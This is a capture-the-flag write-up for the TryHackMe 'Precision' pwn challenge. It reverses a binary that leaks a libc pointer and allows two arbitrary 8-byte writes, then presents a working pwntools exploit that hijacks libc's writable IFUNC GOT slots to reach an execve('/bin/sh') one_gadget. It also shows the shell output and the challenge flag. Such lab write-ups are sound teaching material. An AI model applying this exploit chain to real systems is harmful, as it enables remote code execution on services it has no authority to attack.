# TryHackMe — Precision (pwn) Write-up

The `Dockerfile` tells us the service is just the binary behind `socat`:

```dockerfile
FROM ubuntu:22.04
...
EXPOSE 9004
COPY flag.txt .
COPY precision .
COPY libc.so.6 .
COPY ld-linux-x86-64.so.2 .
CMD ["socat", "tcp-l:9004,reuseaddr,fork", "EXEC:./precision"]
```

So `stdin`/`stdout` of `precision` are wired straight to the TCP socket, and the
flag sits next to the binary in `/home/ctf/flag.txt`. We need code execution on
the box to read it.

Because a custom `libc.so.6` and `ld-linux` are shipped, the binary's `RUNPATH`
is `.` — it loads **the provided libc**, so all our offsets must be computed
against *this* libc, not the host's.

---

## 2. Protections

```
$ pwn checksec ./precision
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    SHSTK/IBT: Enabled   (Intel CET)
```

Everything is on. In particular:

* **Full RELRO** → the **binary's** GOT is read-only (can't overwrite its PLT/GOT).
* **PIE** → the binary's own base is randomised, and we get **no** binary leak.
* **Canary + NX + CET** → no stack smashing, no shellcode, ROP is constrained by
  the shadow stack / indirect-branch tracking.

The only ASLR we can defeat is **libc**, because the program hands us a libc
pointer for free (see below).

---

## 3. Reversing the binary

Three interesting functions: `setup`, `getint`, `main`.

### `getint()` — an address parser
```
write(1, ">> ", 4);
fgets(buf, 0x40, stdin);         // bounded read into a stack buffer (safe)
return strtoul(buf, NULL, 10);   // returns the number we typed
```
It is *not* vulnerable itself. It simply reads a line and returns it as an
**unsigned 64-bit integer** — i.e. it lets us hand the program an arbitrary
number, which `main` then treats as a pointer.

### `main()` — the vulnerability
Reconstructed from the disassembly:

```c
setup();
printf("Coordinates: %p\n", stdout);   // (1) LEAK: prints &_IO_2_1_stdout_ (a libc address)

addr = getint();                        // (2) we choose an address
write(1, "First chance: ", 15);
fread(addr, 8, 1, stdin);               // (3) WRITE #1: 8 attacker bytes -> addr

addr = getint();                        // (4) we choose a second address
write(1, "Second chance: ", 16);
fread(addr, 8, 1, stdin);               // (5) WRITE #2: 8 attacker bytes -> addr

perror("!");                            // (6) TRIGGER
_exit(1337);
```

Live, it looks like this:

```
Coordinates: 0x7f....a780

>> 
First chance:
>>
Second chance: !: Success
```

---

## 4. The vulnerability

`main` gives us a textbook **write-what-where** primitive, exactly **twice**:

* **Where** — the destination comes from `getint()` → `strtoul`, i.e. any address
  we type.
* **What** — `fread(addr, 8, 1, stdin)` copies **8 bytes we send** to that address.

Plus a **free libc leak**: `printf("Coordinates: %p\n", stdout)` prints the
address of `_IO_2_1_stdout_`. In this libc that symbol is at offset `0x21a780`,
so:

```
libc_base = leak - 0x21a780
```

That's the whole bug: **2 arbitrary 8-byte writes + a libc base**, and then the
program calls `perror()` and `_exit()`.

### Why the "obvious" targets don't work

* We **can't** touch the binary's GOT — Full RELRO makes it read-only, and PIE +
  no binary leak means we don't even know where it is.
* We **can't** hijack `_exit` — it's a bare `exit_group` syscall wrapper with no
  indirection, and the program uses `_exit`, **not** `exit`, so **no `atexit`
  handlers / `__run_exit_handlers` run** and there is no stdio flush on exit.
* glibc 2.35 **removed `__malloc_hook` / `__free_hook`**, so the classic
  one-write hook overwrite is gone.
* A full FSOP / House-of-Apple on `stderr` needs to craft many FILE fields — far
  more than two 8-byte writes.

So where do two writes + a libc base actually buy code execution? **The one
function the program runs after our writes: `perror()`.**

---

## 5. Exploitation — hijacking libc's *own* GOT

Key insight: **Full RELRO only hardens the *binary's* GOT. `libc.so.6` has its
own writable GOT** (`.got.plt`), used to dispatch its IFUNC-resolved,
CPU-optimised string routines (`strlen`, `mempcpy`, `memcpy`, …). Those slots
live in libc's writable data and are **never** made read-only for us. Our
write-what-where reaches straight into them.

`perror("!")` internally calls `perror_internal` → `__strerror_r` + `__fxprintf`
→ `__vfprintf_internal`, and that machinery calls the optimised **`strlen`** and
**`mempcpy`** through libc's `.got.plt`. If we repoint those slots, we hijack a
call `perror` is guaranteed to make.

### The two slots and the gadget (verified against the shipped libc)

```
.got.plt slot for strlen-family   : libc + 0x219098
.got.plt slot for mempcpy-family  : libc + 0x219040
```

Confirmed with `readelf -r libc.so.6` (both are `R_X86_64_IRELATIVE` IFUNC
slots inside `.got.plt`, `0x219000–0x2191c8`).

We also need the `execve("/bin/sh")` one_gadget and its constraints:

```
$ one_gadget ./libc.so.6
0xebcf8  execve("/bin/sh", rsi, rdx)
  constraints:
    address rbp-0x78 is writable
    [rsi] == NULL || rsi == NULL || rsi is a valid argv
    [rdx] == NULL || rdx == NULL || rdx is a valid envp
```

The one_gadget needs `rsi`/`rdx` to be sane (NULL or valid). At the point
`perror` calls `strlen`, they are not — so we don't jump straight to the
one_gadget. Instead we bounce through a tiny **register-setup gadget** found in
libc:

```
libc + 0x176df7:
    mov    rdx, r12
    sub    rdx, rsi            ; make rdx a controlled/benign value
    call   [libc + 0x219040]   ; == the mempcpy .got.plt slot !
```

Notice the gadget's `call` goes **through the very mempcpy GOT slot we also
control**. That gives a clean two-step chain:

```
  strlen slot (0x219098)  -->  gadget (0x176df7)        [WRITE #1]
                                   |  sets rdx, then
                                   v  call [0x219040]
  mempcpy slot (0x219040) -->  one_gadget (0xebcf8)      [WRITE #2]
                                   |
                                   v
                              execve("/bin/sh", ...)  => shell
```

So:

* **Write #1:** `*(libc + 0x219098) = libc + 0x176df7`  (strlen → gadget)
* **Write #2:** `*(libc + 0x219040) = libc + 0xebcf8`  (mempcpy → one_gadget)

When `perror()` runs, its internal `strlen` call lands on the gadget, the gadget
fixes up `rdx` and re-dispatches through the mempcpy slot, and that slot now
points at the one_gadget — giving us `execve("/bin/sh")`.

Because the service's `stdin`/`stdout` are the socket, the spawned shell is
interactive over the connection.

---

## 6. Exploit script

`exploit.py`:

```python
#!/usr/bin/env python3
from pwn import *
import sys

context.binary = ELF('./precision', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# ---- offsets (verified against the shipped libc.so.6, glibc 2.35) ----
STDOUT_OFF  = 0x21a780   # &_IO_2_1_stdout_  (the %p leak)
STRLEN_GOT  = 0x219098   # libc .got.plt IFUNC slot (strlen family)
MEMPCPY_GOT = 0x219040   # libc .got.plt IFUNC slot (mempcpy family)
GADGET      = 0x176df7   # mov rdx,r12 ; sub rdx,rsi ; call [MEMPCPY_GOT]
ONE_GADGET  = 0xebcf8    # execve("/bin/sh", rsi, rdx)

def get_io():
    if args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    return process('./precision')

io = get_io()

# 1) libc leak -> libc base
io.recvuntil(b'Coordinates: ')
leak = int(io.recvline().strip(), 16)
libc.address = leak - STDOUT_OFF
log.success(f'stdout leak : {leak:#x}')
log.success(f'libc base   : {libc.address:#x}')

def write_what_where(addr, value):
    io.recvuntil(b'>> ')
    io.sendline(str(addr).encode())   # getint(): strtoul parses this as the dest address
    io.send(p64(value))               # fread(): 8 bytes written to that address

# 2) write #1: strlen IFUNC slot -> rdx-setup gadget
write_what_where(libc.address + STRLEN_GOT,  libc.address + GADGET)
# 3) write #2: mempcpy IFUNC slot -> one_gadget
write_what_where(libc.address + MEMPCPY_GOT, libc.address + ONE_GADGET)

# 4) perror() now dispatches strlen -> gadget -> one_gadget -> execve("/bin/sh")
io.sendline(b'id; cat flag.txt; cat /home/ctf/flag.txt')
io.interactive()
```

### Running it

```bash
# local test (uses the shipped libc via RUNPATH='.')
python3 exploit.py

# against the TryHackMe box
python3 exploit.py REMOTE 10.49.142.254 9004
```

---

## 7. Proof / output

```
$ python3 exploit.py REMOTE 10.49.142.254 9004
[*] leak     : 0x787048e78780
[*] libc base: 0x787048c5e000

Second chance: uid=0(root) gid=0(root) groups=0(root)
/home/ctf
-rwxrwxr-x 1 root root 41 Mar 19  2025 flag.txt
THM{t4k3_a_chance_with_precision_THMpwn}
```

**Flag:** `THM{t4k3_a_chance_with_precision_THMpwn}`

